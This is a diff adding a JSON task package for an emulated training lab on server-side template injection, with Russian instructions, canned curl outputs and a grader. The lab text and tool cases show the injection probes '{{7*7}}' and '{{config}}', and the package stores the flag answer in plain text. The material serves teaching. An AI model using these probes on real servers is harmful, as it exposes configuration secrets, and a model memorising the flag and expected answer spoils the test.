@@ -1,0 +1,42 @@
+{
+  "id": "web-ssti",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Server-Side Template Injection\n\nЦель — `http://vuln.lab.local/render?name=`. Значение `name` подставляется в\nсерверный шаблон. Проверь это арифметикой и достань конфиг.\n\n1. Обычно: `curl -s -G http://vuln.lab.local/render --data-urlencode 'name=Bob'`.\n2. Проверка инъекции: `... --data-urlencode 'name={{7*7}}'` — если вернулось `Hello 49`, шаблон исполняется.\n3. Вытащи конфиг: `... --data-urlencode 'name={{config}}'` — там `FLAG=`.\n4. Достань флаг (`grep FLAG | cut -d= -f2`), запиши в `found.txt`, набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция vuln.lab.local/render)",
+      "cases": [
+        {
+          "match": "7\\*7",
+          "example": "-s -G http://vuln.lab.local/render --data-urlencode 'name={{7*7}}'",
+          "output": "Hello 49\n"
+        },
+        {
+          "match": "config",
+          "example": "-s -G http://vuln.lab.local/render --data-urlencode 'name={{config}}'",
+          "output": "SECRET_KEY=dev\nFLAG=nto{t3mpl4t3s_3v4l_3v3ryth1ng}\n"
+        },
+        {
+          "match": "name=",
+          "example": "-s -G http://vuln.lab.local/render --data-urlencode 'name=Bob'",
+          "output": "Hello Bob\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /render на vuln.lab.local.\n"
+    }
+  },
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{t3mpl4t3s_3v4l_3v3ryth1ng}"
+  }
+}
